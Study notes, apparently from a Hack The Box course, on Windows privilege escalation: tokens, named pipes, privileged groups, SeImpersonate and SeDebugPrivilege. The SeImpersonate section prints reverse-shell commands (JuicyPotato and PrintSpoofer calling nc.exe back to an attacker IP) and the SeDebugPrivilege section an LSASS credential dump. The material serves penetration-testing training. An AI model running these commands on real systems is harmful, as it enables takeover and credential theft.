## Communication with Processes
- **Access Token**
    - In Windows, access tokens are used to describe the security context (security attributes or rules) of a process or thread.
    - The token includes information about the user account's identity and privileges related to a specific process or thread.
    - When a user authenticates to a system, their password is verified against a security database, and if properly authenticated, they will be assigned an access token.
    - Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level.


- **Enumerating Network Services**
    ```bat
    # Display Active Network Connections
    C:\htb> netstat -ano
    ```
    - Examples:
        1. Splunk 
            - One of the best examples of this type of privilege escalation is the Splunk Universal Forwarder, installed on endpoints to send logs into Splunk. 
            - The default configuration of Splunk did not have any authentication on the software and allowed anyone to deploy applications, which could lead to code execution. 
            - Again, the default configuration of Splunk was to run it as SYSTEM$ and not a low privilege user.
            - Check out [Splunk Universal Forwarder Hijacking](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) and [SplunkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/).

        2. Erlang
            - Another overlooked but common local privilege escalation vector is the Erlang Port (25672). 
            - Erlang is a programming language designed around distributed computing and will have a network port that allows other Erlang nodes to join the cluster. 
            - The secret to join this cluster is called a cookie. 
            - Many applications that utilize Erlang will either use a weak cookie (RabbitMQ uses rabbit by default) or place the cookie in a configuration file that is not well protected. 

- **Named Pipes**
    - Named pipes are like chat rooms for programs on the same computer. They let two programs talk to each other by sending and receiving messages.

    - **Key Points:**
    1. What's a Pipe?
        - A pipe is like a tube where one program writes messages, and another reads them.
    2. Named Pipes:

        - A "named pipe" is just a pipe with a name (like \\.\pipe\my_pipe) so programs know where to connect.
    3. How Communication Works:

        - One program creates the pipe (server).
        - Another program connects to it (client) to send or receive messages.
        - They can either:
            - Send data one way (like a one-way street).
            - Send data both ways (like a conversation).
    4. Cobalt Strike Example:

        - Cobalt Strike uses named pipes for safe communication:
            1. It creates a pipe (e.g., \\.\pipe\msagent_12).
            2. Commands run in another program, and results are sent through the pipe.
            3. This keeps the main program safeâ€”if the command crashes, it doesn't affect the main tool.
    5. Why Change Names?

        - Hackers might rename pipes to look like something harmless, like a Chrome-related name (mojo), to avoid detection.
    6. How to Spot Named Pipes:

        - Use tools like [PipeList](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist) to see which pipes are active and who's using them.

    ```bat
    # Listing Named Pipes with Pipelist
    C:\htb> pipelist.exe /accepteula
    ```
    ```powershell
    # Listing Named Pipes with PowerShell
    PS C:\htb>  gci \\.\pipe\

    ```
    - After obtaining a listing of named pipes, we can use Accesschk to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL), which shows us who has the permissions to modify, write, read, or execute a resource.
    ```bat
    # Reviewing LSASS Named Pipe Permissions
    C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v

    ```
    
> [!TIP]
> Using accesschk we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \pipe\* -v`

## Windows User Privileges
- **Windows Privileges Overview**
- Privileges in Windows are rights that an account can be granted to perform a variety of operations on the local system.
- Privileges are different from access rights, which a system uses to grant or deny access to securable objects. 
- User and group privileges are stored in a database and granted via an access token when a user logs on to a system.
- Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled.

- **Windows Authorization Process**
- Security principals are anything that can be authenticated by the Windows operating system, including user and computer accounts, processes that run in the security context or another user/computer account, or the security groups that these accounts belong to.
- Security principals are the primary way of controlling access to resources on Windows hosts.
- Every single security principal is identified by a unique Security Identifier (SID). When a security principal is created, it is assigned a SID which remains assigned to that principal for its lifetime.

- **Rights and Privileges in Windows**
- Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment.Some of these groups are listed below:

|Group	| Description  | 
|:------|:-------------|
|Default Administrators|	Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|	Members can modify services, access SMB shares, and backup files.|
|Backup Operators|	Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|	Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|	If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|	Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|	Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.|
|Remote Management Users|	Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|	Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|	Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|	Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.|

- **User Rights Assignment**
- Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account.
- This Microsoft article on [User Rights Assignment](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment) provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right.

- Typing the command `whoami /priv` will give you a listing of all user rights assigned to your current user.
- When a privilege is listed for our account in the Disabled state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled.
- Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out.
- We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process.
- One example is this [PowerShell script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.

### SeImpersonate and SeAssignPrimaryToken
- In Windows, every process has a token that has information about the account that is running it. 
- These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. 
- To utilize the token, the SeImpersonate privilege is needed.

- **SeImpersonate Example - JuicyPotato**
```bash
# Connecting with MSSQLClient.py
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

# Enabling xp_cmdshell
SQL> enable_xp_cmdshell

# Confirming Access
SQL> xp_cmdshell whoami

# Checking Account Privileges
SQL> xp_cmdshell whoami /priv

```
- [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.
```bash
# Escalating Privileges Using JuicyPotato
sudo nc -lnvp 8443

SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
# -l is the COM server listening port 
# -p is the program to launch (cmd.exe)
# -a is the argument passed to cmd.exe
# -t is the createprocess call.
```

### PrintSpoofer and RoguePotato
- JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access.
- This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

- Again, connect with mssqlclient.py and use the tool with the -c argument to execute a command.
```bash
# Escalating Privileges using PrintSpoofer
nc -lnvp 8443

SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

```
### SeDebugPrivilege
- To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. 
- By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. 
- This right may be assigned to developers who need to debug new system components as part of their day-to-day job.
- We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system.
```bat
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

> [!TIP]
> It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

- **RCE as a SYSTEM**
    - Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it. 
    - If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly.

    - First, transfer this [PoC](https://github.com/decoder-it/psgetsystem) script over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly

```powershell
# open an elevated PowerShell console and tasklist
PS C:\htb> tasklist

```
- winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.
![psgetsys](/images/psgetsys_winlogon.jpg)

- We could also use the Get-Process cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script.
